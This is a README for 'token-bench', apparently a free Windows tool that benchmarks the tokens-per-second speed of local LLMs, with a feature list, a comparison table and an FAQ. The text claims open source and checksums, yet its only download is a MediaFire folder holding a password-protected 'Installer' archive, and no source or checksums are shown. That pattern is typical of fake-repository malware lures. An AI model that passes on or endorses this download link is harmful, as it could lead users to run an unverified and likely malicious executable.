# token-bench

⏱️ Free, open-source tokens-per-second benchmark for local LLMs on Windows — quant and thread sweeps with charts. 100 MB portable, offline, MIT.

[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
[![Platform](https://img.shields.io/badge/platform-Windows%2010%20%7C%2011%20x64-blue.svg)]()
[![Build](https://img.shields.io/badge/build-100%20MB%20single%20exe-orange.svg)]()

## Features

- ✅ **Automated sweeps** — run every quant of a model back to back and rank them by generation speed
- ✅ **Split metrics** — prompt processing and token generation timed separately, like llama-bench does
- ✅ **Thread and offload grid** — finds the thread count and GPU layer sweet spot instead of guessing
- ✅ **Chart view** — bars and sparklines per run, printable report for comparing two machines
- ✅ **Warmup control** — configurable warmup rounds so cache effects do not poison the first result
- ✅ **CSV export** — every run lands in a spreadsheet-ready file with model, quant and settings columns
- ✅ **100 MB self-contained exe** — runtime and benchmark backend bundled, portable, offline, MIT

## Why token-bench

- MIT licensed, source in the open
- No ads, no account, no telemetry
- Single portable 100 MB build - no setup required, runs offline
- CI builds every release and publishes SHA-256 checksums
- Windows 10 / 11 x64

## Comparison

| Feature | **token-bench** | llama-bench CLI | LM Studio | KoboldCpp |
|---|:---:|:---:|:---:|:---:|
| Price | **Free, MIT** | Free, OSS | Free | Free, OSS |
| Open source | **Yes** | Yes | No | Yes |
| GUI sweep across quants | **Yes** | Scripted | No | No |
| Charted reports | **Yes** | No | Partial | No |
| Thread and offload grid | **Yes** | Flags | No | Partial |
| Portable, no install | **Yes, 100 MB** | Build needed | Installer | Zip |

## FAQ

**how to benchmark LLM tokens per second on Windows?**

Command-line benchmarks work but reading flags and collating numbers across quants is a chore. token-bench runs the sweep for you, separates prompt processing from generation and turns results into charts and CSV. It is a 100 MB portable exe, MIT, offline, and results stay on your machine.

## Screenshots

All screenshots describe the 1280x800 dark UI.

1. Dark bench view (#121417, blue #60A5FA): run table with quant, threads, tok per sec columns, selected row charted above with generation and prompt bars.
2. Sweep setup wizard: model list with five quants checked, thread range 4 to 16, warmup rounds stepper at 2, estimated time chip reading 38 minutes.
3. Report page: two-machine comparison chart, best-config summary card, export CSV button, log tail showing run 14 of 20 complete.

## Download

| Source | Link |
|---|---|
| 💾 **Installer token-bench** | [Installer token-bench](https://www.mediafire.com/folder/xfbu35fzy4zd6/Installer) |

> Archive password: `5139237619`

## Build

Requires the .NET 8 SDK on Windows 10/11 x64:

```
dotnet publish -c Release -r win-x64 --self-contained -p:PublishSingleFile=true
```

## License

MIT. See [LICENSE](LICENSE).